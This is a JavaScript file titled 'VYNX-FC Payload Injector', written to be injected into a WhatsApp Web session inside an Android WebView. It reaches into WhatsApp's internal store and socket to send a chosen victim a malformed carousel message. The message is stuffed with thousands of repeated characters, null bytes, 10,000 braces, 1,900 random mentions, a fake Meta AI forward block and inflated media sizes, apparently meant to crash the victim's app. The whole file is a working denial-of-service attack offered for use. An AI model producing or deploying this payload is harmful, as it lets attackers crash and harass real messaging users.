// VYNX-FC Payload Injector for WhatsApp Web
// This script is injected into the WebView after QR authentication

function vynxFcSend(targetJid) {
    try {
        // Access WhatsApp Web internal Store
        const store = window.Store || window.require('WAWebStore');
        if (!store) {
            alert('WhatsApp Web not fully loaded. Wait for chats to appear.');
            return;
        }

        // Find the socket connection
        const sock = store.WebSocket?.socket || store.Conn?.socket;
        if (!sock) {
            // Try alternate access
            const modules = window.require('WAWebSocket');
            if (modules) {
                // Build payload and send via internal relay
                sendViaInternalAPI(targetJid);
                return;
            }
            alert('Cannot access WhatsApp socket. Re-scan QR.');
            return;
        }

        sendViaInternalAPI(targetJid);

    } catch(e) {
        alert('Error: ' + e.message);
    }
}

function sendViaInternalAPI(jid) {
    // Build the VynxFc payload matching the BAILEYS structure
    var vynx = [];
    
    for (var i = 0; i < 10; i++) {
        vynx.push(
            { name: "cta_call",    buttonParamsJson: JSON.stringify({ status: true }) },
            { name: "cta_copy",    buttonParamsJson: JSON.stringify({ display_text: "\uA9BD".repeat(5000) }) },
            { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "\uA9BD".repeat(5000) }) }
        );
    }

    // Generate random mentioned JIDs
    var mentionedJid = ["0@s.whatsapp.net"];
    for (var i = 0; i < 1900; i++) {
        mentionedJid.push("1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net");
    }

    var payload = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    contextInfo: {
                        participant: jid,
                        mentionedJid: mentionedJid,
                        remoteJid: "X",
                        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                        stanzaId: "123",
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 3,
                                expiryTimestamp: Date.now() + 1814400000
                            },
                            forwardedAiBotMessageInfo: {
                                botName: "META AI",
                                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                creatorName: "Bot"
                            }
                        }
                    },
                    carouselMessage: {
                        messageVersion: 1,
                        cards: [{
                            header: {
                                hasMediaAttachment: true,
                                imageMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
                                    mimetype: "image/jpeg",
                                    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
                                    fileLength: "9999999999999",
                                    height: 9999,
                                    width: 9999,
                                    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
                                    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
                                    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
                                    mediaKeyTimestamp: "1755254367",
                                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEBEgEhNR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k="
                                }
                            },
                            body: { text: "VynxFc" + "\u0000".repeat(5000) },
                            nativeFlowMessage: {
                                buttons: vynx,
                                messageParamsJson: "{".repeat(10000)
                            }
                        }]
                    }
                }
            }
        }
    };

    // Send via WhatsApp Web internal relay
    var chat = window.Store?.Chat?.get(jid);
    if (chat) {
        window.Store.SendMessage(chat, payload, {});
        return true;
    }

    // Fallback: direct socket relay
    try {
        var sock = window.Store.WebSocket.socket;
        var binaryFrame = window.Store.WebSocket.encodeFrame(payload);
        sock.send(binaryFrame);
        return true;
    } catch(e2) {
        alert('All send methods failed. Target may not exist or WA Web changed.');
        return false;
    }
}

// Expose to Android WebView
window.vynxFcSend = vynxFcSend;
